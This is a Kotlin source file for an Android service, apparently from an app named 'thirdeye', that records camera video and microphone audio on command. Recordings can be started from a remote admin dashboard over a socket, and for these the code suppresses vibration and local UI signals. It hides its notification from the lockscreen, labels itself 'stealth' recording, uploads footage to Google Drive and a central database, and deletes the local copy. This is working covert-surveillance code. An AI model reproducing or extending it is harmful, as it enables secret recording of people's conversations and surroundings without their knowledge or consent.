package com.thirdeye.app.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.util.Size
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.FileOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.Recording
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.thirdeye.app.MainActivity
import com.thirdeye.app.R
import com.thirdeye.app.uploader.BackendClient
import com.thirdeye.app.uploader.DriveUploaderWorker
import com.thirdeye.app.uploader.SocketManager
import com.thirdeye.app.utils.AppPreferences
import com.thirdeye.app.utils.HapticUtil
import com.thirdeye.app.utils.StorageUtil
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class CameraRecordingService : LifecycleService() {

    companion object {
        private const val TAG = "CameraRecService"
        const val CHANNEL_ID = "thirdeye_silent_service_channel"
        const val NOTIFICATION_ID = 1001

        const val ACTION_START_RECORDING = "com.thirdeye.app.ACTION_START"
        const val ACTION_STOP_RECORDING = "com.thirdeye.app.ACTION_STOP"
        const val ACTION_RECORDING_STATUS_CHANGED = "com.thirdeye.app.STATUS_CHANGED"
        const val EXTRA_IS_RECORDING = "extra_is_recording"
        const val EXTRA_ENABLE_VIBRATION = "extra_enable_vibration"
        const val EXTRA_CAMERA_LENS = "extra_camera_lens"
        const val EXTRA_IS_REMOTE = "extra_is_remote"

        @Volatile
        var isServiceRunning = false

        @Volatile
        var isStopping = false

        @Volatile
        private var instance: CameraRecordingService? = null

        fun startService(context: Context, enableVibration: Boolean = false, cameraLens: String? = null, isRemote: Boolean = false) {
            val intent = Intent(context, CameraRecordingService::class.java).apply {
                action = ACTION_START_RECORDING
                putExtra(EXTRA_ENABLE_VIBRATION, enableVibration)
                putExtra(EXTRA_IS_REMOTE, isRemote)
                if (cameraLens != null) {
                    putExtra(EXTRA_CAMERA_LENS, cameraLens)
                }
            }
            try {
                ContextCompat.startForegroundService(context, intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start CameraRecordingService", e)
            }
        }

        fun stopService(context: Context, enableVibration: Boolean = false) {
            val activeInstance = instance
            if (activeInstance != null) {
                activeInstance.postStopRecording(enableVibration)
                return
            }
            val intent = Intent(context, CameraRecordingService::class.java).apply {
                action = ACTION_STOP_RECORDING
                putExtra(EXTRA_ENABLE_VIBRATION, enableVibration)
            }
            try {
                ContextCompat.startForegroundService(context, intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send stop to CameraRecordingService", e)
            }
        }
    }

    private var activeRecording: Recording? = null
    private var currentOutputFile: File? = null
    private var timerJob: Job? = null
    private var shouldVibrate: Boolean = false
    private var isRemoteRecording: Boolean = false
    private lateinit var prefs: AppPreferences

    fun postStopRecording(enableVibration: Boolean = false) {
        ContextCompat.getMainExecutor(this).execute {
            shouldVibrate = if (isRemoteRecording) false else enableVibration
            stopRecording()
        }
    }

    private var cameraProvider: ProcessCameraProvider? = null
    private var cameraExecutor: ExecutorService? = null
    private var lastFrameTime = 0L

    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == Intent.ACTION_BATTERY_LOW) {
                Log.w(TAG, "Battery low event received, auto-saving video safely.")
                stopRecording()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        isServiceRunning = true
        prefs = AppPreferences(this)
        cameraExecutor = Executors.newSingleThreadExecutor()
        createSilentNotificationChannel()
        startForegroundWithNotification()

        val filter = IntentFilter(Intent.ACTION_BATTERY_LOW)
        registerReceiver(batteryReceiver, filter)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        startForegroundWithNotification()

        when (intent?.action) {
            ACTION_START_RECORDING -> {
                val isRemote = intent.getBooleanExtra(EXTRA_IS_REMOTE, false)
                isRemoteRecording = isRemote
                shouldVibrate = if (isRemote) false else intent.getBooleanExtra(EXTRA_ENABLE_VIBRATION, false)
                val overrideLens = intent.getStringExtra(EXTRA_CAMERA_LENS)
                if (!overrideLens.isNullOrEmpty()) {
                    prefs.cameraLens = overrideLens.uppercase()
                    Log.i(TAG, "Override camera lens set to: ${prefs.cameraLens}")
                }
                if (activeRecording == null && !isStopping) {
                    initAndStartCameraRecording()
                } else {
                    Log.w(TAG, "Recording already active or in stopping state (activeRecording=$activeRecording, isStopping=$isStopping)")
                }
            }
            ACTION_STOP_RECORDING -> {
                if (intent.hasExtra(EXTRA_ENABLE_VIBRATION)) {
                    shouldVibrate = if (isRemoteRecording) false else intent.getBooleanExtra(EXTRA_ENABLE_VIBRATION, false)
                }
                stopRecording()
            }
        }

        return START_NOT_STICKY
    }

    private fun createSilentNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notification_channel_name),
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = getString(R.string.notification_channel_desc)
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundWithNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_content))
            .setSmallIcon(R.drawable.ic_camera_record)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // CRITICAL FIX: CAMERA|MICROPHONE combined type.
                // withAudioEnabled() is called in prepareRecording, so we use BOTH types.
                // Using only CAMERA while capturing audio causes Android 14 to block
                // the FGS type and fall back to DATA_SYNC, which disables camera policy.
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                )
                Log.i(TAG, "✅ Recording FGS started with CAMERA|MICROPHONE type")
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (secEx: SecurityException) {
            Log.w(TAG, "⚠️ FGS CAMERA|MIC type background restricted on Android 14. Trying CAMERA only: ${secEx.message}")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                    )
                } else {
                    startForeground(NOTIFICATION_ID, notification)
                }
            } catch (e2: SecurityException) {
                Log.w(TAG, "⚠️ CAMERA type also blocked. Falling back to dataSync FGS type: ${e2.message}")
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        startForeground(
                            NOTIFICATION_ID,
                            notification,
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                        )
                    } else {
                        startForeground(NOTIFICATION_ID, notification)
                    }
                } catch (e: Exception) {
                    startForeground(NOTIFICATION_ID, notification)
                }
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun initAndStartCameraRecording() {
        // Storage safety check
        if (StorageUtil.getAvailableStorageMB(this) < 200) {
            Log.e(TAG, "Storage too low to record")
            prefs.isRecording = false
            isServiceRunning = false
            isStopping = false
            notifyStatusChanged(false)
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return
        }

        lifecycleScope.launch(Dispatchers.Main) {
            var waitLoops = 0
            while (LiveStreamService.isServiceRunning && waitLoops < 25) {
                delay(100)
                waitLoops++
            }
            val cameraProviderFuture = ProcessCameraProvider.getInstance(this@CameraRecordingService)
            cameraProviderFuture.addListener({
                try {
                    val provider = cameraProviderFuture.get()
                    bindRecordingUseCase(provider)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to get camera provider", e)
                    prefs.isRecording = false
                    isServiceRunning = false
                    isStopping = false
                    notifyStatusChanged(false)
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                }
            }, ContextCompat.getMainExecutor(this@CameraRecordingService))
        }
    }

    @SuppressLint("MissingPermission")
    private fun bindRecordingUseCase(provider: ProcessCameraProvider) {
        this.cameraProvider = provider
        provider.unbindAll()

        val lensFacing = if (prefs.cameraLens == "FRONT") {
            CameraSelector.LENS_FACING_FRONT
        } else {
            CameraSelector.LENS_FACING_BACK
        }

        val cameraSelector = CameraSelector.Builder()
            .requireLensFacing(lensFacing)
            .build()

        val quality = when (prefs.videoQuality) {
            "480p" -> Quality.SD
            "1080p" -> Quality.FHD
            else -> Quality.HD // 720p default
        }

        val qualitySelector = QualitySelector.from(
            quality,
            androidx.camera.video.FallbackStrategy.lowerQualityOrHigherThan(Quality.SD)
        )

        // Offline Bitrate Optimization:
        // Keeps videos crystal clear while reducing file size by up to 70%!
        val targetBitrate = when (prefs.videoQuality) {
            "480p" -> 900_000
            "1080p" -> 4_000_000
            else -> 1_800_000 // 720p default
        }

        val recorder = Recorder.Builder()
            .setQualitySelector(qualitySelector)
            .setTargetVideoEncodingBitRate(targetBitrate)
            .build()

        val videoCapture = VideoCapture.withOutput(recorder)

        try {
            // Video Recording is #1 TOP PRIORITY:
            // Bind dedicated VideoCapture use-case exclusively to camera hardware
            provider.bindToLifecycle(this, cameraSelector, videoCapture)

            currentOutputFile = if (isRemoteRecording) {
                StorageUtil.createRemoteOutputFile(this)
            } else {
                StorageUtil.createOutputFile(this)
            }
            val fileOutputOptions = FileOutputOptions.Builder(currentOutputFile!!).build()

            val pendingRecording = videoCapture.output
                .prepareRecording(this, fileOutputOptions)
                .withAudioEnabled()

            activeRecording = pendingRecording.start(ContextCompat.getMainExecutor(this)) { recordEvent ->
                when (recordEvent) {
                    is VideoRecordEvent.Start -> {
                        Log.i(TAG, "🎥 Dedicated 720p HD stealth video recording started successfully (isRemote: $isRemoteRecording).")
                        if (!isRemoteRecording) {
                            prefs.isRecording = true
                            if (shouldVibrate) {
                                HapticUtil.vibrateStart(this)
                            }
                        }
                        isStopping = false
                        notifyStatusChanged(true)
                        BackendClient.sendPing(this)
                        startCountdownTimer()
                    }
                    is VideoRecordEvent.Finalize -> {
                        Log.i(TAG, "Video recording finalized.")
                        handleRecordingFinalized(recordEvent)
                        BackendClient.sendPing(this)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Binding camera use cases failed", e)
            if (!isRemoteRecording) {
                prefs.isRecording = false
            }
            isServiceRunning = false
            isStopping = false
            isRemoteRecording = false
            notifyStatusChanged(false)
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    private fun startCountdownTimer() {
        timerJob?.cancel()
        val durationMillis = prefs.maxDurationMinutes * 60 * 1000L
        timerJob = lifecycleScope.launch {
            delay(durationMillis)
            Log.i(TAG, "Max recording duration reached (${prefs.maxDurationMinutes}m). Auto-stopping.")
            stopRecording()
        }
    }

    private fun stopRecording() {
        timerJob?.cancel()

        // If not actively recording (e.g. zombie state or already stopped), immediately clean up
        if (activeRecording == null) {
            Log.w(TAG, "stopRecording called but activeRecording is null. Self-healing recording state.")
            if (!isRemoteRecording) {
                prefs.isRecording = false
                if (shouldVibrate) {
                    HapticUtil.vibrateStop(this)
                }
            }
            isServiceRunning = false
            isStopping = false
            isRemoteRecording = false
            notifyStatusChanged(false)
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return
        }

        isStopping = true
        val rec = activeRecording
        activeRecording = null
        try {
            rec?.stop()
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping active recording", e)
        }

        // Safety watchdog: if CameraX doesn't finalize within 3.5s, force cleanup
        lifecycleScope.launch {
            delay(3500)
            if (prefs.isRecording || isRemoteRecording || isServiceRunning) {
                Log.w(TAG, "Safety watchdog: CameraX finalize timed out. Forcing cleanup.")
                if (!isRemoteRecording) {
                    prefs.isRecording = false
                    if (shouldVibrate) {
                        HapticUtil.vibrateStop(this@CameraRecordingService)
                    }
                }
                isServiceRunning = false
                isStopping = false
                isRemoteRecording = false
                notifyStatusChanged(false)
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
        }
    }

    private fun handleRecordingFinalized(event: VideoRecordEvent.Finalize) {
        val wasRemote = isRemoteRecording
        if (!wasRemote) {
            prefs.isRecording = false
            if (shouldVibrate) {
                HapticUtil.vibrateStop(this)
            }
        }
        isServiceRunning = false
        isStopping = false

        // CRITICAL FIX: notifyStatusChanged BEFORE resetting isRemoteRecording flag.
        // notifyStatusChanged checks isRemoteRecording internally to decide whether to
        // send local broadcast vs socket emit. If we reset the flag first, remote
        // recordings would never emit the 'device-recording-status' socket event,
        // causing the dashboard to show 'Recording' forever even after stop.
        notifyStatusChanged(false)

        // NOW safe to reset the remote flag
        isRemoteRecording = false

        try {
            cameraProvider?.unbindAll()
            cameraProvider = null
        } catch (e: Exception) {
            // Ignored
        }

        if (!event.hasError()) {
            val savedFile = currentOutputFile
            if (savedFile != null && savedFile.exists() && savedFile.length() > 0L) {
                Log.i(TAG, "🎥 Video saved successfully to: ${savedFile.absolutePath} (wasRemote: $wasRemote)")
                // Immediate background upload to Google Drive & Central DB (purges local copy if wasRemote)
                DriveUploaderWorker.uploadImmediatelyOrEnqueue(applicationContext, savedFile.absolutePath, isRemote = wasRemote)
            }
        } else {
            Log.e(TAG, "❌ Recording error: ${event.error}")
        }

        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun notifyStatusChanged(isRecording: Boolean) {
        // Only broadcast to phone local MainActivity UI for manual (non-remote) recordings
        if (!isRemoteRecording) {
            val intent = Intent(ACTION_RECORDING_STATUS_CHANGED).apply {
                putExtra(EXTRA_IS_RECORDING, isRecording)
                setPackage(packageName)
            }
            sendBroadcast(intent)
        }
        // ALWAYS emit to socket regardless of remote/local — Admin Dashboard must always know!
        // This is critical: remote recordings MUST emit so dashboard "Stop Rec" button works.
        SocketManager.emitRecordingStatus(applicationContext, isRecording)
        Log.i(TAG, "📡 Recording status emitted via socket: $isRecording (isRemote=$isRemoteRecording)")
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // If recording is running and user swipes away app from Recents, keep recording running!
        if (prefs.isRecording && activeRecording != null) {
            Log.i(TAG, "Task removed from recents, keeping foreground recording alive.")
        }
    }

    override fun onDestroy() {
        if (instance == this) {
            instance = null
        }
        timerJob?.cancel()
        try {
            unregisterReceiver(batteryReceiver)
        } catch (e: Exception) {
            // Ignored
        }
        try {
            activeRecording?.stop()
        } catch (e: Exception) {
            // Ignored
        }
        activeRecording = null
        try {
            cameraProvider?.unbindAll()
            cameraProvider = null
        } catch (e: Exception) {
            // Ignored
        }
        cameraExecutor?.shutdown()
        cameraExecutor = null
        prefs.isRecording = false
        isServiceRunning = false
        isStopping = false
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }
}
